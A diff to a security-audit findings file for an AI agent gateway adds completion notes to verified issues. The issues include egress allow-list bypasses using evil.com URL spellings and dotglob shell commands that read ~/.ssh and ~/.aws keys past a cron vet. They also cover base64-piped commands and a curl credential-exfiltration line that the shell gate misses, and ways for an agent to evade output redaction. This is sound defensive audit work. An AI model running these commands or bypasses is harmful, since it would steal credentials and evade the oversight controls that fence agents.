@@ -5,6 +5,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 ## 3. Security and reliability
 
 ### REL-12 [75, default, effort M] Outbox video cards stall the event loop and crash-loop the gateway — CONFIRMED
+
+> **COMPLETED** — covered by open upstream PR #17351 ("cache content-scan verdicts and serialize the scans"; diff verified: `_scan_verdict` cache + serialization with tests); not duplicated.
 - **Verified claim:** GET /api/outbox/{filename} (what every outbox audio/video FileCard points its <video preload=metadata>/<audio> at) reads the whole file (<=50 MB cap) and, on every request, runs binary_content_is_flagged (latin-1 decode + full redact_via_context alternation, then wide_content_is_flagged) through asyncio.to_thread. The regex passes hold the GIL inside single C calls, so the to_thread offload does not keep the event loop live: measured on this host, one 50 MB scan = 7.6 s wall with a 4.4 s max loop stall; 4 concurrent = 15.5 s max stall; 8 concurrent = 28.8 s max stall, which exceeds the 25 s default loop-watchdog exit budget (desktop/foreground launches) and would kill the gateway; managed services use 90 s. Nothing caches the verdict, and the route ignores Range, so each browser re-request (metadata + moov seek, re-open after restart) re-scans the full file and re-arms the stall.
 - **Evidence (at `397f4be`):**
   - website/src/components/FileCard.tsx:62 — url = `/api/outbox/${encodeURIComponent(file.filename)}`; :82 <video controls preload="metadata" src={url}>; :71 same for <audio>
@@ -29,6 +31,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G9(#17304), verification_needed:Part3(#17304), verify_needed:G36, verify_needed:G43
 
 ### SEC-1 [70, armed, effort M] Egress allow-list bypass via backslash before @ — CONFIRMED
+
+> **COMPLETED** — fixed on `main` in `c906d25` (`fix/egress-host-parsing`): the egress gate now derives special-scheme hosts the WHATWG way (backslash fold, slash-ignore, percent-decode, IDNA, IPv4 canonical form, one trailing dot stripped) and emits a never-permittable marker for underivable hosts; governance.md updated in-commit.
 - **Verified claim:** governance._url_host parses with urllib.parse.urlparse and takes the text after the LAST '@' of the netloc, so `https://evil.com\@good.com/` (and `https://evil.com\\@good.com/`) is classified as host `good.com`. A WHATWG parser (node `new URL`, the same standard the Rust `url` crate follows) treats `\` as `/` for special schemes and resolves host `evil.com`. The bypass holds in BOTH ruleset modes: allow:[good.com] PERMITs it, and deny:[evil.com] also PERMITs it. Measured through the real gate_decision. Not checked here: whether kiro-cli's fetch tool sends the URL unchanged and connects to evil.com, because kiro-cli is not installed. node's WHATWG parse stands in for it.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/platform/governance.py:740 — `parsed = urlparse(s)`
@@ -55,6 +59,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** FIX_PLAN:SEC-1, REVIEW_FINDINGS:Part1#1, verify_needed:A5, verify_needed:X7, FIX_PLAN-old:S1-S3
 
 ### SEC-2 [65, armed, effort S] Scheme-only URLs (https:evil.com, http:/evil.com) skip the egress check — CONFIRMED
+
+> **COMPLETED** — fixed with SEC-1 in `c906d25`: scheme-only spellings now resolve their host, so deny lists bind through the corrected derivation.
 - **Verified claim:** For `https:evil.com`, `http:/evil.com` and `https:/evil.com/x`, _url_host returns '' because the no-`://` branch only recovers a host when the first path segment is a numeric port. classify_tool_args then emits no network.egress pair, for fetch kind and for the kindless shape fallback alike. gate_decision returns PERMIT under both allow:[good.com] and deny:[evil.com]. WHATWG (node `new URL`) resolves host `evil.com` for all three. Fail-open on a governed egress ceiling. Not checked here: whether kiro-cli's fetch tool actually fetches these spellings.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/platform/governance.py:750-758 — `host_port_form = first_seg.isdigit() and _looks_like_host(scheme)`; otherwise netloc=''
@@ -76,6 +82,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** FIX_PLAN:SEC-2, REVIEW_FINDINGS:Part1#2, verify_needed:A5, verify_needed:X7, FIX_PLAN-old:S1-S3
 
 ### SEC-5 [55, default, effort S] Standard sandbox tier leaves ~/.aws, ~/.ssh, ~/.kube readable to spawned shells — CONFIRMED
+
+> **COMPLETED (doc part)** — `4740ae1` (`docs/standard-tier-readable-stores`): the tier table and sandbox docstring now name all seven readable stores (incl. `.config/gh`, `.npmrc`, `.netrc`, `.git-credentials`); no mask changed — the tier's reach is the operator's to widen (options a–d remain theirs).
 - **Verified claim:** Measured with the real sandbox (macOS Seatbelt, throwaway HOME). At the default tier (`agent.sandbox: auto` -> standard), a child spawned through sandbox.wrap_argv can open() and read ~/.aws/credentials, ~/.ssh/id_ed25519 and ~/.kube/config. It can also read four stores the claim and the security.md tier table do not list: ~/.config/gh/hosts.yml (the gh CLI token), ~/.npmrc, ~/.netrc and ~/.git-credentials. ~/.gnupg, ~/.docker, ~/.azure and ~/.config/gcloud are blocked. At `strict`, all eleven seeded stores are blocked. This is the documented, deliberate standard-tier trade-off (git-over-SSH, credential_process, kubectl), and the file tools still refuse these paths through is_sensitive_path. A shell or interpreter the agent spawns is fenced only by the tier.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/sandbox.py:6-12 — standard 'DELIBERATELY leaves ~/.aws, ~/.ssh and ~/.kube visible ... a spawned shell's open() is not fenced at this tier'
@@ -98,6 +106,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:V-1
 
 ### SEC-3 [50, armed, effort S] Trailing-dot hostname bypasses egress deny list — CONFIRMED
+
+> **COMPLETED** — fixed with SEC-1 in `c906d25`: one trailing dot stripped from the extracted host; a trailing-dot host-matcher entry now warns as dead like the other dead shapes.
 - **Verified claim:** _match_host compares `item.strip().casefold()` against the pattern with fnmatch and strips no trailing dot. `https://evil.com./` gives item `evil.com.`, and `sub.evil.com.` matches neither `evil.com` nor `*.evil.com`. A deny list [evil.com, *.evil.com] therefore PERMITs both. DNS resolves `evil.com.` to the same name, and WHATWG keeps the dot (`evil.com.`), so the client still connects there. In allow mode the same mismatch only causes a false denial (`good.com.` is refused), which fails closed.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/platform/governance.py:239-241 — `return fnmatch.fnmatch(item.strip().casefold(), pattern.strip().casefold())`
@@ -117,6 +127,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** FIX_PLAN:SEC-3, REVIEW_FINDINGS:Part1#3, verify_needed:A5, verify_needed:X7, FIX_PLAN-old:S1-S3
 
 ### REL-13 [45, default, effort M] Identity sweep spares live-account parents; others' running subagents are still killed — PARTLY
+
+> **COMPLETED** — fixed on `main` in `34da2f3` (`fix/identity-sweep-live-children-busy`): a parent with RUNNING/QUEUED children is busy for the sweep (the same `_snapshot_parent_children` selection the teardown would cancel through), flagged `retire_on_identity_change` and skipped — never retired-and-cancelled; `spawned_under` not widened (the item's own recommendation); the optional empty-fingerprint variant not taken. session.md + subagent.md updated in-commit.
 - **Original claim:** Identity-change sweep force-kills running subagents (corrected below)
 - **Verified claim:** At HEAD the sweep spares any session whose spawn-identity stamp provably equals the live fingerprint (spawned_under), and spared sessions are neither retired nor counted against completeness — the in-code comment describes exactly the #17360 failure as the reason. The residual defect: a parent that is idle by the semaphore test but whose provider is unstamped or stamped under a different account is still retired, and its running/queued subagents are cancelled (_snapshot_parent_children -> _cancel_parent_children) mid-prompt; there is still no 'has running children' predicate. When the live fingerprint is empty (identity store unreadable/relocated/signed out) nothing is spared, the sweep stays incomplete, and every subsequent turn re-sweeps and kills idle parents' running children again. A busy old-account session also keeps the sweep incomplete, so it re-runs each turn until that session's next acquire retires it.
 - **Evidence (at `397f4be`):**
@@ -135,6 +147,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G11(#17360), verification_needed:Part3(#17360), verify_needed:G43
 
 ### SEC-6 [45, default, effort M] Third-party env tokens not scrubbed from agent subprocesses — CONFIRMED
+
+> **COMPLETED (doc part)** — `3b23fb1` (`docs/env-scrub-blast-radius`): the surviving third-party token names are stated in security.md (names only); the inherit-all default stands — scrubbing more is an operator decision, not taken.
 - **Verified claim:** The agent-child environment scrub (scrub_agent_subprocess_env, applied parent-side in acp/client.py and acp/runtime.py) drops only names starting with AWS_SECRET, AWS_SESSION, SSH_AUTH_SOCK, GNUPGHOME or GIT_ASKPASS, the Crew-owned channel/integration tokens in _AGENT_DENIED_ENV_KEYS, and the PYTHON* prefixes. Measured: GITHUB_TOKEN, GH_TOKEN, OPENAI_API_KEY, NPM_TOKEN, HF_TOKEN, GOOGLE_API_KEY, DATABASE_URL, AWS_ACCESS_KEY_ID and AWS_PROFILE all survive into the child. ANTHROPIC_* and CLAUDE_CODE_* survive by the documented env-passthrough contract. AWS_ACCESS is added only to the MCP gateway-daemon scrub (mcp_gateway/manager.py), not the agent's. AWS_ACCESS_KEY_ID alone is an identifier, since its secret is scrubbed. Exposure depends on how the gateway was launched: a shell-launched gateway inherits the user's exports, while service units bake a limited environment.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/sandbox.py:5825-5831 `_SENSITIVE_ENV_PREFIXES = ["AWS_SECRET", "AWS_SESSION", "SSH_AUTH_SOCK", "GNUPGHOME", "GIT_ASKPASS"]`
@@ -158,6 +172,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:V-2
 
 ### SEC-12 [45, armed, effort M] Cron vet leading-dot rule broken by bash dotglob — CONFIRMED
+
+> **COMPLETED (doc part)** — `15feae0` (`docs/cron-vet-accident-rail`): the false "primary control" claim corrected in cron_script.py (the vet is an accident rail; the sandbox tier fences ~/.ssh); learn-cron-dashboard.md carries no matching claim at HEAD. Delegated decision taken: (b) parity with the agent's own standard tier — flipping to (a) strict remains an owner opt-in.
 - **Verified claim:** Demonstrated, and broader than dotglob. Cron shell commands run through cron_script.run_command_sandboxed under wrap_argv(mode="cc"), which deliberately leaves ~/.ssh readable. The code comment names the storage-time text vet (mcp_cron._vet_shell_command) as 'the primary control' for that exposure. In a throwaway HOME with ~/.ssh/id_rsa, the vet DENIES `cat ~/.ssh/id_rsa` and `cat ~/.s?h/id_rsa`. It PASSES, and the cc-sandboxed runner then prints the private key for, all of: `bash -O dotglob -c 'cat ~/*/id_rsa'`, `bash -c 'shopt -s dotglob; cat ~/*/id_rsa'`, `bash -c 'GLOBIGNORE=x; cat ~/*/id_rsa'`, `find ~ -name id_rsa -exec cat {} +`, and a python3 -c that builds '.ssh' at run time. The leading-dot rule at mcp_cron.py:984 is one instance; the underlying defect is that a text matcher is carrying a path fence, which AGENTS.md says it cannot. Note: the subject here IS a shell command line, not a script body, so the cron-script-body invariant is not engaged. cron_add is not in the default agent's allowedTools, so under `ask` mode the operator sees the command before it is stored. Negative control on this host (macOS, sandbox-exec): the cron runner's cc wrap IS active. `bash -O dotglob -c 'cat ~/*/config.json'` and `... ~/*/secring` (passes the vet) cannot read the seeded ~/.docker or ~/.gnupg, so the ~/.ssh read is the cc tier's deliberate visibility, not a missing sandbox. Also measured on macOS: `bash -O dotglob -c 'cat ~/*/credentials'` passes the vet and READS ~/.aws/credentials, because Seatbelt's declared cc capability gap (sandbox_plan.CAPABILITIES: cc_unmaskable_dirs={'.aws'}) leaves ~/.aws readable at cc. On macOS the text vet is therefore the only fence for ~/.aws in cron commands as well. On Linux the cc tier masks ~/.aws.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/cron_script.py:2985-2995 — 'mode="cc" ... deliberately leaving ~/.ssh reachable ... the residual .ssh exposure is covered by the storage-time deny-list (mcp_cron._vet_shell_command, which blocks any .ssh reference) — the primary control'
@@ -228,6 +244,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:V-7
 
 ### SEC-18 [40, default, effort M] Batch redact() quadratic on long eyJ runs freezes the dashboard — CONFIRMED
+
+> **COMPLETED** — fixed on `main` in `fc55dc8` (`fix/redact-jwt-scan-linear`): pass 1 scans two channels merged in the alternation's own order — every other branch as one `finditer`, the multi-segment JWT candidates by index arithmetic over maximal token runs — keeping the JSON-header post-filter and the one-character-on resume byte-identical (differenced over crafted+fuzzed inputs; 80k adversarial 1061 ms → 9 ms). security.md updated in-commit.
 - **Verified claim:** Measured: security.redact() is quadratic on a single contiguous base64url run that contains `eyJ` repeatedly (eyJ every 40 chars, no dots or terminators). 10k chars 18 ms, 20k 69 ms, 40k 266 ms, 80k 1.07 s, 160k 4.25 s, about x4 per doubling. redact_credentials alone accounts for it (80k: 1.06 s). Extrapolated to the 512,000-char api_file_read cap that is about 43 s. In api_file_read, `content = redact(content)` runs inline in the async handler, not off-loop, so opening such a file in the dashboard freezes every surface the gateway serves for that long. A single long eyJ run and a dotted eyJ.x.y chain stay linear.
 - **Evidence (at `397f4be`):**
   - ran: eyJ-every-40 run: 10k 18.2 ms, 20k 68.9 ms (x3.8), 40k 265.9 ms (x3.9), 80k 1071.9 ms (x4.0), 160k 4.25 s
@@ -248,6 +266,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:Part3(#17553), verify_needed:G37
 
 ### REL-18 [35, default, effort S] Session RSS ceiling never fires on macOS — CONFIRMED
+
+> **COMPLETED** — covered by open upstream PR #17052 ("measure the session RSS ceiling on macOS"; diff verified: `darwin_footprint_tree_mb` via platform_compat, wired into session_pid + session_cleanup + session.md); not duplicated.
 - **Verified claim:** On macOS get_session_rss_mb returns 0 for every process tree (explicit `if sys.platform != "linux": return 0`), and the cleanup sweep's non-Windows path reads /proc statm, which does not exist on macOS, so both the per-session ceiling (session.watchdog_rss_max_mb, opt-in, default 0) and the always-on background-runtime ceiling (BACKGROUND_RSS_FALLBACK_MB = 1536 MiB) never fire on macOS. A macOS-capable tree reading already exists in the codebase (acp/runtime_process_tree._get_rss_tree_mb via proc_phys_footprint_bytes_for_pid) and is not used by these ceilings.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/session_pid.py:5561-5617 get_session_rss_mb — `if sys.platform != "linux": return 0`; docstring: 'macOS has no ctypes-only per-pid RSS path, so it returns 0 and the ceiling stays inert'
@@ -268,6 +288,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G15(#17043), verify_needed:G37
 
 ### REL-22 [35, default, effort S] Mount-source janitor waits for a new session; idle or tmpfs-full hosts never sweep — PARTLY
+
+> **COMPLETED** — fixed on `main` in `9c15511` (`fix/cleanup-loop-boot-start`): the cleanup loop is kicked post-bind from both gateway entrypoints (`_kick_cleanup_loop` in `server_runtime/maintenance.py`); `start_cleanup` idempotent so registration keeps its one-loop guarantee; the per-pass budget unchanged. session.md updated in-commit.
 - **Original claim:** Sandbox mount-source janitor never runs without a fresh chat (corrected below)
 - **Verified claim:** Narrower than claimed. The kirocrew_sb_<pid>_* mount-source janitor (sandbox_mount_sweep via sandbox.cleanup_stale_sandbox_profiles) runs only inside SessionCleanup's _cleanup_loop — once at loop start, then every tick (<= 300 s) — and that loop is started lazily by _ensure_cleanup_task(), whose only caller is the registration of a NEW session in _get_or_create_impl, after `await provider.start()` succeeds. So it starts with the first new session of ANY kind (a chat, including the default-on eager spawn when a chat slot is created, a subagent, a cron run, a memory consolidation), not only a chat. What does NOT start it: the boot-time background runtime (registered directly into _sessions by session_background._ensure_background) and the warm pool. The real gaps: (1) an idle or headless gateway that creates no new session after boot never sweeps while its background runtime and MCP respawns keep staging entries; (2) a host whose runtime tmpfs is already exhausted cannot successfully start a session (the code's own comment: 'a host in that state cannot spawn an agent AT ALL'), so the janitor that would fix it never starts — a self-locking failure. Each pass is also capped at 10 s. Linux namespace launcher only; the 8,004/7 min rate is reporter-measured, not reproducible on this macOS host.
 - **Evidence (at `397f4be`):**
@@ -332,6 +354,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:Part3(#17125/#17124/#17126)
 
 ### SEC-13 [35, default, effort M] Streaming redaction holdback too short for long key-anchored values — CONFIRMED
+
+> **COMPLETED** — fixed on `main` in `776f6fa` (`fix/stream-holdback-escalation`): an over-cap credential-class run is itself STRONG (escalates to the 4096 ceiling, fails closed past it like Bearer/JWT); a JSON-quoted PEM body is held across escaped line breaks and marker-phrase spaces, with an in-progress END marker holding like the BEGIN one. security.md updated in-commit.
 - **Verified claim:** Measured with the real StreamRedactor. For a key=value-anchored secret longer than _STREAM_HOLDBACK_MAX (512), such as `password=<600..6000 chars>`, `{"client_secret": "<...>"}` or `api_key: <...>`, streamed in 7-char chunks (and 64-char chunks from ~1000 chars up), parts of the secret reach the stream output unredacted. Batch redact() of the same text redacts it fully. `Authorization: Bearer <...>` and long JWTs (3.3k and 6.3k chars) are NOT leaked: those 'strong anchors' already get the fail-closed sticky discard and the 4096 JWT ceiling. Separately, a realistic GCP service-account JSON (private_key with JSON-escaped \n line breaks, so each 64-char PEM line is under the bound) leaks 3 of 24 PEM body lines through the stream at every chunk size, while batch redaction leaks none. Correction to the claim: the leak flows from model OUTPUT to live surfaces (dashboard websocket, Slack/messaging streaming, side panels), not 'to the model'. The persisted copy gets a final full-text pass.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/security/__init__.py:442 `_STREAM_HOLDBACK_MAX = 512`; :458 `_STREAM_HOLDBACK_JWT_MAX = 4096`
@@ -417,6 +441,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G30(#17153)
 
 ### SEC-9 [35, armed, effort M] No MCP tool-schema pinning after 'Trust this tool' — CONFIRMED
+
+> **COMPLETED** — fixed on `main` in `4c8b7b8` (`fix/mcp-tool-drift-pin`): per-tool sha256 digests over (name, description, inputSchema) recorded to `tool-digests.json` beside the launch approvals (same read-only-in-sandbox dir), compared on every complete tools/list off the event loop; drift surfaces as an SEL event + warning — served, not withheld (block remains an owner opt-in); partial listings skipped; non-stubbed servers documented out of scope. mcp.md + security.md updated in-commit.
 - **Verified claim:** There is no pinning of an MCP server's advertised tool descriptions or input schemas. The only content-bound approval is mcp_gateway/launch_approval.py, which fingerprints the resolved command+args (hash_command) and the declared env (hash_declared_env) of a stubbed server's LAUNCH. A server whose launch is unchanged can change what its tools say or accept, and that reaches the model without re-approval. This includes `npx pkg@latest`-style launches whose argv hash never changes while the code does. The gateway fans out `notifications/tools/list_changed` to every stub. Persistent tool trust is name-based: ACP `allow_always` (kept by the harness) and Crew `auto_approve_tools` globs. A repo-wide search for schema/description hash, digest, drift or fingerprint found nothing. Crew can only observe tools/list for gateway-stubbed servers (backend.py records what each stub is told its tools are). Per-session servers launched directly by kiro-cli are outside Crew's view.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/mcp_gateway/launch_approval.py:1-35 — approval binds 'hash_command over the resolved command and args, and hash_declared_env over the declared env'
@@ -459,6 +485,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G12(#17397), verification_needed:Part3(#17397)
 
 ### REL-24 [30, default, effort S] Cron-store saves are not crash-durable — CONFIRMED
+
+> **COMPLETED** — covered by open upstream PR #16859 ("make cron store writes crash-durable", open); not duplicated.
 - **Verified claim:** CronService._save writes the whole cron store with atomic_write(self._path, document) using atomic_write's default fsync=False and never fsyncs the parent directory, so the temp-file-plus-rename is atomic against a PROCESS crash but not durable against an OS crash or power loss: the rename can reach disk before the data, leaving an empty/stale jobs file or losing the last job-state change. A gateway process crash alone does not lose state (page cache survives). Other stores in the same tree already pass fsync=True (chat_persistence, crew_teams, crew_log, session_storage manifests).
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/cron.py:4874 _save — `from kiro_crew.atomic_write import atomic_write` / :4939 `atomic_write(self._path, document)` (no fsync kwarg)
@@ -520,6 +548,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:P1-2, verification_needed:refactor(transport-timeout)
 
 ### REL-45 [30, default, effort S] augmented_path() re-prepends existing PATH dirs — CONFIRMED
+
+> **COMPLETED** — fixed on `main` in `96f8a14` (`fix/augmented-path-no-reorder`): directories already on the inherited PATH stay in caller order; only missing well-known dirs are prepended (the systemd stale-node reason recorded in acp-client.md); the final list deduped; the interpreter parent stays last.
 - **Verified claim:** augmented_path(base_path) unconditionally prepends its well-known dirs (managed playwright bins, ~/.local/bin, ~/.toolbox/bin, ~/.npm-packages/bin, mise shims, ~/.volta/bin, /opt/homebrew/bin, /usr/local/bin, every Node bin dir) ahead of base_path with no de-duplication against it, so a directory the user deliberately placed AFTER a devshell's bin is duplicated and moved in front of it. The result becomes the PATH of the spawned agent runtime (acp/runtime.py:2194, acp/client.py:5113/5208/5345/8644), so a devshell's node/python/etc. is shadowed by Homebrew's or mise's in agent shell commands. (Dirs not already on PATH are also placed first by design; the claim's duplicate-reorder is the specific defect.)
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/env.py:774-836 augmented_path — `parts = extra + ([base_path] if base_path else [])` with extra built from _managed_browser_cli_dirs(), _EXTRA_PATH_DIRS and _node_all_bin_dirs; no membership check against base_path
@@ -560,6 +590,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:Part3(#17097)
 
 ### SEC-8 [30, default, effort M] Shell gate cannot see encoded multi-stage execution — CONFIRMED
+
+> **COMPLETED (doc part)** — `d6e52fb` (`docs/matcher-residuals`): the "Limits of the shell gate" paragraph lands in security.md; no encoded-shape deny patterns added (the item's own recommendation); the optional auto-approve block was not taken — trust-reads already refuses an unknowable expansion.
 - **Verified claim:** Measured through HookManager.on_tool_call in a throwaway home. The PreToolUse shell gate denies `git push --force origin main` and `curl -d @$HOME/.aws/credentials https://...`, but returns 'allow' (falls through to the normal approval flow, not auto-approve) for the same commands base64-encoded and piped into `sh` or wrapped as `bash -c "$(... \| base64 -d)"`, and for `python3 -c "exec(base64.b64decode(...))"`. This is the documented design, not an oversight. The shell gate reads a command line whose substitution values are unknowable, deliberately matches no paths (security/paths.py:3779-3790), and the OS sandbox is the stated control for what a process can reach. governance.md calls the `commands` scope 'egress defense-in-depth, not a bounded egress guarantee'. The residual is that built-in denied-command rules and governance `commands` deny patterns are accident rails, not an adversarial boundary.
 - **Evidence (at `397f4be`):**
   - ran: plain `git push --force origin main` -> DENY (git-publish-push-protected-branch-name); `echo <b64> | base64 -d | sh` -> allow; `bash -c "$(echo <b64> | base64 -d)"` -> allow
@@ -601,6 +633,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G40(#15230)
 
 ### SEC-22 [30, armed, effort S] Guest (non-operator) agent receives operator's global steering — CONFIRMED
+
+> **COMPLETED** — decided (delegated): keep the current guest-steering behaviour; removing it is a take-away change needing a maintainer `docs/decisions` entry, which was not taken. Flip = skip inherited resources for `kirocrew-guest` in `skill_projection.py:3023-3031`.
 - **Verified claim:** Re-ran the existing SPEC-4 measurement. With workspace inheritance at its default (cli.json `kirocrew.skillDiscovery.inheritFiles: True`, `inheritSource: global`), prepare_native_skill_projection appends `file://<kiro_home>/steering/**/*.md`, `file://.kiro/steering/**/*.md` and `file://AGENTS.md` to EVERY agent view. That includes kirocrew-guest, which carries 3 resources matching 33,973 B of seeded steering. kirocrew-guest is the tool-less agent a NON-operator channel sender talks to ('a trust boundary that mounts nothing'). It has no tools, but the operator's global steering (the absolute ~/.kiro/steering glob) sits in its context, where an admitted non-operator can ask about it.
 - **Evidence (at `397f4be`):**
   - src/kiro_crew/acp/skill_projection.py:3023-3031 — `if inherited: for view in specs.values(): for resource in (f"file://{kiro_home().as_posix()}/steering/**/*.md", "file://.kiro/steering/**/*.md", "file://AGENTS.md")`
@@ -619,6 +653,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** FIX_PLAN:SPEC-4/guest-steering-note
 
 ### SEC-4 [30, armed, effort S] meets_min_version: '0.3.0-rc.1' passes a 0.3.0 floor; PEP 440 '0.3.0rc1' fails every floor — PARTLY
+
+> **COMPLETED** — fixed on `main` in `3c28069` (`fix/version-floor-comparator`): one shared comparator (`kiro_crew.versioning`) for the floor and the update check; a prerelease of X.Y.Z is below an X.Y.Z floor; floor intersection ordered the same way; `_version_tuple` deleted; governance.md updated in-commit.
 - **Original claim:** Pre-release build satisfies the min_version floor (corrected below)
 - **Verified claim:** UpdatePins.meets_min_version uses _version_tuple, which splits off everything after the first '-' or '+' and int()s the dotted core. Two opposite errors follow, depending on how the build is stamped. (a) As claimed: the semver-hyphenated stamps from the desktop and Windows lanes (`0.3.0-nightly.20260708t061155`, `0.3.0-rc.1`, `0.3.0-rc1`) compare equal to `0.3.0` and satisfy a `min_version: 0.3.0` floor. (b) Not in the claim: the PEP 440 stamps the CLI-wheel lane writes into __version__ (`0.3.0rc1`, `0.3.0.dev20260708061155`, and promoted stable bytes carrying `X.Y.ZrcN`) do not parse. _version_tuple returns (), so meets_min_version is False against ANY floor (`0.9.0rc1` vs floor `0.2.0` -> False). update_required() therefore reports every pip-installed insider or nightly host as below the floor whenever a floor is pinned. A correct PEP 440 + semver-suffix comparator already exists in dashboard/handlers/updates.py (_version_key / _is_newer).
 - **Evidence (at `397f4be`):**
@@ -729,6 +765,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G15(#17041), verify_needed:G37
 
 ### SEC-19 [25, default, effort M] redact() now keeps {token} and <token>; still redacts $TOKEN, %s and any 200+ char query — PARTLY
+
+> **COMPLETED** — decided (delegated): keep the documented token_parameter residual and the `exfil_query_length` heuristic as-is; narrowing without measured FP/FN data is a guess, and the residual is already documented in code. No code change.
 - **Original claim:** Redaction false positives mangle legitimate content (corrected below)
 - **Verified claim:** Measured with security.redact(). The token_parameter false positive on template placeholders is mostly fixed at HEAD: `?token={token}`, `?token={{ api_token }}` and `?token=<your-token>` are kept, because _TOKEN_PARAM_VALUE_CLASS excludes `{}<>`, backtick and `\|\^`. Three shapes still redact, documented as an 'ACCEPTED RESIDUAL': `?token=$TOKEN`, `?token=%s` and `?token=YOUR_TOKEN_HERE`, all made of legal query bytes. exfil_query_length still redacts any URL whose query is 200 chars or more, whatever the host. A Google Maps directions URL and a GitHub search URL both became '[REDACTED: suspicious URL to <host>]'. The code deliberately forbids per-shape waivers and says to 'narrow or replace this heuristic for EVERY host on its own merits'. Both rules mangle legitimate content that reaches model context and surfaces, at a security trade-off the code records.
 - **Evidence (at `397f4be`):**
@@ -751,6 +789,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G15(redaction-FP), verify_needed:G37
 
 ### SEC-20 [25, default, effort M] Control-split credential/exfil tokens not redacted — CONFIRMED
+
+> **COMPLETED** — covered by open upstream PR #14747 ("redact control-split credential and exfil tokens"; diff verified: `terminal_safe` fold-with-map redaction preserving byte fidelity); not duplicated.
 - **Verified claim:** Measured with security.redact(). A ghp_ token and an AKIA access-key id are redacted when plain, but NOT when one character is inserted mid-token from any of: NUL, BEL, ESC, SOH, DEL, CR, an ANSI SGR sequence, ZERO WIDTH SPACE U+200B, ZERO WIDTH JOINER U+200D, SOFT HYPHEN U+00AD or BOM U+FEFF. A 300-char exfil-shaped URL split by NUL, ZWSP or ESC is not redacted either. The invisible code points (ZWSP, ZWJ, soft hyphen, BOM) make this different from SEC-10's encodings: the secret renders visually intact to a human on the dashboard or in a channel, and copy-paste may carry it whole. Upstream PR #14747 ('redact control-split credential/exfil tokens') is not reflected at HEAD.
 - **Evidence (at `397f4be`):**
   - ran: ghp plain=R | NUL, BEL, ESC, SOH, DEL, ZWSP, ZWJ, SOFT HYPHEN, BOM, CR, ANSI SGR = not redacted
@@ -906,6 +946,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** FIX_PLAN:REL-7, REVIEW_FINDINGS:Part1#10
 
 ### SEC-10 [20, default, effort S] Output redaction is shape-based; hex/rot13/chunked emission evades it — CONFIRMED
+
+> **COMPLETED (doc part)** — `b291147` (`docs/matcher-residuals`): "What redaction does not cover" lands in security.md's XPIA section, pointing at the sandbox tier, env scrub and exfil gate; no encoded-shape heuristics added (the item's own recommendation).
 - **Verified claim:** Measured with security.redact(). A plain `aws_secret_access_key = ...` line and a plain ghp_ token are redacted, and so is a base64-encoded key=value line ('[REDACTED: encoded credential]'). The same secrets hex-encoded, rot13'd, split into 8-character lines, or space-separated pass through unchanged. This is inherent to shape-based redaction and is consistent with how the project positions it: an output-boundary defense in depth, with the OS sandbox tier, the env scrub and the exfil gate as the controls. A secret the agent can read (SEC-5/SEC-6) can be re-encoded by the agent at will.
 - **Evidence (at `397f4be`):**
   - ran: plain key=value -> [REDACTED: credential]; plain ghp_ token -> redacted; base64(key=value) -> [REDACTED: encoded credential]
@@ -923,6 +965,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verification_needed:V-6
 
 ### SEC-15 [20, default, effort M] MCP identity now per session via signed tokens; tokenless stub connections still per PID — PARTLY
+
+> **COMPLETED** — covered by open upstream PR #17524 ("stop answering MCP identity per process on a runtime hosting several sessions"; diff verified: `_apply_claim`/`identity.py` hunks + the tokenless-connection tests); not duplicated.
 - **Original claim:** MCP session identity answered per process on shared runtimes (corrected below)
